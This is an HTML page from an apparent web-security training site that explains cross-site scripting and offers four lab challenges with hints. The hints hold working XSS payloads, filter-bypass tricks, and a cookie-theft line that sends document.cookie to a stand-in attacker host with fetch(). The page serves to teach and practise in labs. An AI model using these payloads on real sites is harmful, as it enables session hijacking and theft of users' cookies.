<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>XSS â€” ProjectUnsafe</title>
  <link rel="stylesheet" href="/static/style.css"/>
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%232d3436'/%3E%3Cpath d='M16 6l8.66 5v10L16 26l-8.66-5V11L16 6z' fill='none' stroke='%23ff8c00' stroke-width='2.5'/%3E%3Ccircle cx='16' cy='16' r='3' fill='%23ff8c00'/%3E%3C/svg%3E">
  <style>
    /* â”€â”€ XSS page extras â”€â”€ */
    .xss-hero {
      padding: 5rem 2rem 3rem;
      max-width: 860px;
      margin: 0 auto;
    }

    .back-link {
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.78rem;
      letter-spacing: 2px;
      color: var(--dim);
      text-decoration: none;
      margin-bottom: 2.5rem;
      transition: color 0.2s;
    }
    .back-link:hover { color: var(--accent2); }
    .back-link::before { content: 'â†'; }

    .xss-hero .section-label { margin-bottom: 0.8rem; }

    .xss-hero h1 {
      font-size: clamp(2.4rem, 6vw, 4rem);
      font-weight: 800;
      color: #fff;
      line-height: 1.1;
      margin-bottom: 1.5rem;
    }
    .xss-hero h1 span { color: var(--accent2); }

    .desc-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 2rem;
      margin-top: 2.5rem;
    }
    @media (max-width: 600px) { .desc-grid { grid-template-columns: 1fr; } }

    .desc-card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-left: 3px solid var(--accent2);
      padding: 1.5rem;
    }
    .desc-card h3 {
      font-size: 0.7rem;
      font-family: 'Share Tech Mono', monospace;
      letter-spacing: 3px;
      color: var(--accent2);
      text-transform: uppercase;
      margin-bottom: 0.8rem;
    }
    .desc-card p {
      font-size: 0.9rem;
      color: var(--dim);
      line-height: 1.75;
    }

    .impact-pills {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      margin-top: 1.8rem;
    }
    .pill {
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.72rem;
      letter-spacing: 1.5px;
      padding: 0.3rem 0.8rem;
      border: 1px solid rgba(255,79,110,0.35);
      color: var(--accent2);
      background: rgba(255,79,110,0.07);
    }

    /* â”€â”€ Labs section â”€â”€ */
    .labs-section {
      max-width: 860px;
      margin: 0 auto;
      padding: 1rem 2rem 6rem;
    }

    .labs-section h2 {
      font-size: 1.4rem;
      font-weight: 800;
      color: #fff;
      margin-bottom: 0.4rem;
    }
    .labs-section > p {
      font-size: 0.85rem;
      color: var(--dim);
      margin-bottom: 2rem;
      font-family: 'Share Tech Mono', monospace;
      letter-spacing: 1px;
    }

    .lab-card {
      background: var(--surface);
      border: 1px solid var(--border);
      margin-bottom: 1rem;
      transition: border-color 0.25s;
    }
    .lab-card.open { border-color: var(--accent2); }

    .lab-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 1.2rem 1.5rem;
      cursor: pointer;
      user-select: none;
      gap: 1rem;
    }
    .lab-header:hover .lab-title { color: var(--accent2); }

    .lab-left {
      display: flex;
      align-items: center;
      gap: 1rem;
    }

    .lab-num {
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.75rem;
      color: var(--accent2);
      background: rgba(255,79,110,0.1);
      border: 1px solid rgba(255,79,110,0.25);
      padding: 0.2rem 0.55rem;
      min-width: 2.4rem;
      text-align: center;
    }

    .lab-title {
      font-size: 1rem;
      font-weight: 700;
      color: #fff;
      transition: color 0.2s;
    }

    .lab-badge {
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.65rem;
      letter-spacing: 2px;
      padding: 0.18rem 0.55rem;
      border: 1px solid;
      text-transform: uppercase;
    }
    .badge-easy { border-color: #4ade80; color: #4ade80; }
    .badge-medium { border-color: #facc15; color: #facc15; }
    .badge-hard { border-color: var(--accent2); color: var(--accent2); }

    .lab-chevron {
      font-size: 1rem;
      color: var(--dim);
      transition: transform 0.3s;
      flex-shrink: 0;
    }
    .lab-card.open .lab-chevron { transform: rotate(180deg); color: var(--accent2); }

    /* collapsible body */
    .lab-body {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease;
    }
    .lab-card.open .lab-body { max-height: 600px; }

    .lab-body-inner {
      padding: 0 1.5rem 1.5rem;
      border-top: 1px solid var(--border);
    }

    .lab-desc {
      font-size: 0.88rem;
      color: var(--dim);
      line-height: 1.75;
      margin: 1.2rem 0 1.5rem;
    }

    .lab-actions {
      display: flex;
      gap: 1rem;
      flex-wrap: wrap;
    }

    .lab-btn {
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.8rem;
      letter-spacing: 2px;
      padding: 0.6rem 1.4rem;
      border: none;
      cursor: pointer;
      transition: opacity 0.2s, transform 0.2s;
    }
    .lab-btn:hover { opacity: 0.85; transform: translateY(-2px); }

    .btn-start {
      background: var(--accent2);
      color: #000;
      font-weight: 700;
    }

    .btn-hint {
      background: transparent;
      border: 1px solid var(--dim);
      color: var(--dim);
    }
    .btn-hint:hover { border-color: #fff; color: #fff; }

    /* hint reveal */
    .hint-box {
      display: none;
      margin-top: 1.2rem;
      background: rgba(167,139,250,0.07);
      border: 1px solid rgba(167,139,250,0.25);
      border-left: 3px solid var(--accent3);
      padding: 1rem 1.2rem;
    }
    .hint-box.visible { display: block; }
    .hint-box p {
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.8rem;
      color: var(--accent3);
      line-height: 1.7;
    }
    .hint-box p::before { content: 'ðŸ’¡ HINT: '; opacity: 0.6; }

    /* divider */
    .xss-divider {
      max-width: 860px;
      margin: 0 auto 2rem;
      border: none;
      border-top: 1px solid var(--border);
    }
  </style>
</head>
<body>

<!-- â”€â”€ XSS HERO / DESCRIPTION â”€â”€ -->
<section class="xss-hero reveal">
  <a href="index.html" class="back-link"> Back to Topics</a>
  <p class="section-label">// Web Security Â· XSS</p>
  <h1>Cross-Site<br/><span>Scripting</span></h1>

  <p style="color:var(--dim);font-size:1rem;line-height:1.8;max-width:680px;">
    Cross-Site Scripting (XSS) is a client-side code injection attack where an adversary
    tricks a web application into delivering malicious scripts to end users' browsers.
    Unlike server-side attacks, XSS targets the people using the application â€” not the server itself.
  </p>

  <div class="desc-grid">
    <div class="desc-card">
      <h3>What It Is</h3>
      <p>
        XSS occurs when user-supplied input is rendered in a page without proper sanitization.
        The browser has no way to distinguish the injected script from legitimate page code,
        so it executes it with full trust. Three main variants exist: <strong style="color:#fff">Reflected</strong>
        (server echoes input back), <strong style="color:#fff">Stored</strong>
        (payload persists in a database), and <strong style="color:#fff">DOM-based</strong>
        (manipulation happens entirely in the client).
      </p>
    </div>
    <div class="desc-card">
      <h3>Impact</h3>
      <p>
        A successful XSS attack can steal session cookies and impersonate the victim,
        log every keystroke typed on the page, silently redirect users to phishing sites,
        deface website content, or pivot to deeper attacks like CSRF. Stored XSS is
        especially dangerous â€” one payload can execute for every visitor who loads the page.
      </p>
    </div>
  </div>

  <div class="impact-pills">
    <span class="pill">SESSION HIJACKING</span>
    <span class="pill">COOKIE THEFT</span>
    <span class="pill">KEYLOGGING</span>
    <span class="pill">PHISHING</span>
    <span class="pill">DEFACEMENT</span>
    <span class="pill">CSRF PIVOT</span>
  </div>
</section>

<hr class="xss-divider"/>

<!-- â”€â”€ LABS â”€â”€ -->
<section class="labs-section">
  <h2>Labs</h2>
  <p>// 4 challenges Â· click to expand Â· complete in order</p>

  <!-- Lab 1 -->
  <div class="lab-card" id="lab1">
    <div class="lab-header" onclick="toggleLab('lab1')">
      <div class="lab-left">
        <span class="lab-num">01</span>
        <span class="lab-title">Reflected XSS in Search Field</span>
        <span class="lab-badge badge-easy">EASY</span>
      </div>
      <span class="lab-chevron">â–¼</span>
    </div>
    <div class="lab-body">
      <div class="lab-body-inner">
        <p class="lab-desc">
          A search page reflects your query directly back into the page HTML with no sanitization.
          Your goal is to inject a script that triggers an <code style="color:var(--accent);font-family:'Share Tech Mono',monospace">alert()</code> in the browser.
          This simulates the most basic form of reflected XSS â€” input goes in, script comes out.
        </p>
        <div class="lab-actions">
          <button class="lab-btn btn-start" onclick="startLab(1)">â–¶ START LAB</button>
          <button class="lab-btn btn-hint" onclick="toggleHint('hint1', this)">HINT</button>
        </div>
        <div class="hint-box" id="hint1">
          <p>Try entering <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in the search box. If that's filtered, experiment with event handlers like <code>onerror</code> or <code>onload</code> on an image tag.</p>
        </div>
      </div>
    </div>
  </div>

  <!-- Lab 2 -->
  <div class="lab-card" id="lab2">
    <div class="lab-header" onclick="toggleLab('lab2')">
      <div class="lab-left">
        <span class="lab-num">02</span>
        <span class="lab-title">Stored XSS via Comment Box</span>
        <span class="lab-badge badge-easy">EASY</span>
      </div>
      <span class="lab-chevron">â–¼</span>
    </div>
    <div class="lab-body">
      <div class="lab-body-inner">
        <p class="lab-desc">
          A blog comment section stores user input in a database and renders it for every visitor.
          Inject a persistent payload that fires whenever anyone views the comment thread.
          This demonstrates how a single submission can create a wide-scale attack vector.
        </p>
        <div class="lab-actions">
          <button class="lab-btn btn-start" onclick="startLab(2)">â–¶ START LAB</button>
          <button class="lab-btn btn-hint" onclick="toggleHint('hint2', this)">HINT</button>
        </div>
        <div class="hint-box" id="hint2">
          <p>Check if HTML tags are stripped or encoded. Try submitting a comment with an <code>&lt;img src=x onerror="alert('stored')"&gt;</code> payload and reload the page to see if it persists.</p>
        </div>
      </div>
    </div>
  </div>

  <!-- Lab 3 -->
  <div class="lab-card" id="lab3">
    <div class="lab-header" onclick="toggleLab('lab3')">
      <div class="lab-left">
        <span class="lab-num">03</span>
        <span class="lab-title">DOM-Based XSS via URL Fragment</span>
        <span class="lab-badge badge-medium">MEDIUM</span>
      </div>
      <span class="lab-chevron">â–¼</span>
    </div>
    <div class="lab-body">
      <div class="lab-body-inner">
        <p class="lab-desc">
          The page reads <code style="color:var(--accent);font-family:'Share Tech Mono',monospace">window.location.hash</code> and
          writes it directly to the DOM via <code style="color:var(--accent);font-family:'Share Tech Mono',monospace">innerHTML</code>.
          No server is involved â€” the attack lives entirely in the browser.
          Craft a URL whose fragment contains your payload and lure a victim into clicking it.
        </p>
        <div class="lab-actions">
          <button class="lab-btn btn-start" onclick="startLab(3)">â–¶ START LAB</button>
          <button class="lab-btn btn-hint" onclick="toggleHint('hint3', this)">HINT</button>
        </div>
        <div class="hint-box" id="hint3">
          <p>Append <code>#&lt;img src=x onerror=alert(document.cookie)&gt;</code> to the lab URL. The hash is never sent to the server, so WAFs and server-side filters won't catch it.</p>
        </div>
      </div>
    </div>
  </div>

  <!-- Lab 4 -->
  <div class="lab-card" id="lab4">
    <div class="lab-header" onclick="toggleLab('lab4')">
      <div class="lab-left">
        <span class="lab-num">04</span>
        <span class="lab-title">XSS Filter Bypass &amp; Cookie Exfil</span>
        <span class="lab-badge badge-hard">HARD</span>
      </div>
      <span class="lab-chevron">â–¼</span>
    </div>
    <div class="lab-body">
      <div class="lab-body-inner">
        <p class="lab-desc">
          The application now applies a basic XSS filter that strips <code style="color:var(--accent);font-family:'Share Tech Mono',monospace">&lt;script&gt;</code> tags
          and blocks the word <code style="color:var(--accent);font-family:'Share Tech Mono',monospace">alert</code>.
          Your goal is to bypass the filter, execute arbitrary JavaScript, and exfiltrate
          <code style="color:var(--accent);font-family:'Share Tech Mono',monospace">document.cookie</code> to an attacker-controlled endpoint using <code style="color:var(--accent);font-family:'Share Tech Mono',monospace">fetch()</code>.
        </p>
        <div class="lab-actions">
          <button class="lab-btn btn-start" onclick="startLab(4)">â–¶ START LAB</button>
          <button class="lab-btn btn-hint" onclick="toggleHint('hint4', this)">HINT</button>
        </div>
        <div class="hint-box" id="hint4">
          <p>Try case variation (<code>ScRiPt</code>), double-encoding, or SVG/MathML vectors. For cookie theft, use <code>fetch('https://attacker.com/?c='+document.cookie)</code> or an <code>&lt;img src&gt;</code> beacon. Filters that only run once can be beaten with nested tags like <code>&lt;scr&lt;script&gt;ipt&gt;</code>.</p>
        </div>
      </div>
    </div>
  </div>

</section>

<!-- <script src="/static/script.js"></script>
<script>
  function toggleLab(id) {
    const card = document.getElementById(id);
    card.classList.toggle('open');
  }

  function toggleHint(hintId, btn) {
    const box = document.getElementById(hintId);
    const isVisible = box.classList.toggle('visible');
    btn.textContent = isVisible ? 'HIDE HINT' : 'HINT'; -->
<!-- //   }

//   function startLab(num) {
//     alert('Launching Lab ' + num + '...\n(Connect this button to your lab environment URL.)');
//   }

//   // Scroll reveal
//   const observer = new IntersectionObserver(entries => {
//     entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
//   }, { threshold: 0.1 });
//   document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
// </script> -->
<script>
  function toggleLab(id) {
    document.getElementById(id).classList.toggle('open');
  }
  function toggleHint(hintId, btn) {
    const visible = document.getElementById(hintId).classList.toggle('visible');
    btn.textContent = visible ? 'HIDE HINT' : 'HINT';
  }
  function startLab(num) {
    alert('Launching Lab ' + num + '...\n(Connect this button to your lab environment URL.)');
  }
  const observer = new IntersectionObserver(entries => {
    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
  }, { threshold: 0.1 });
  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
</script>
</body>
</html>
